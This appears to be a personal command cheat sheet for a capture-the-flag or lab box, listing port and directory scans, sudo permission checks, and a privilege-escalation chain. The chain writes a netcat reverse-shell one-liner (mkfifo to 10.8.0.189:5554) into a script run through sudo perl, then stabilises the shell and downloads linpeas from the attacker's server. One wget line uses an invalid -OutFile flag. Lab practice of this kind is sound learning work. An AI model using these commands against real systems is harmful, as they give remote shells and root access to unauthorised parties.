# nmap scan
sudo nmap -sC -sV -oN nmap.md 10.10.179.53 -v


# Gobuster Scan
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.115.76/ -x php,py,js,css,

# dirbuster scan
sudo dirb http://10.10.146.156/ -R 


# Cat all find read
cat *



# To Check Sudo Permissions
sudo -l


# prev esc linux bash shell
sudo bash


# perl write to copy.sh [reverse shell]
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.0.189 5554 >/tmp/f' >/etc/copy.sh

sudo /usr/bin/perl /home/itguy/backup.pl



# python shell - stable bash shell

python3 -c  'import pty;pty.spawn("/bin/bash")'



# run python http server

sudo python -m SimpleHTTPServer 80

sudo wget http://10.8.0.189/linpeas.sh -OutFile /tmp/linpeas.sh
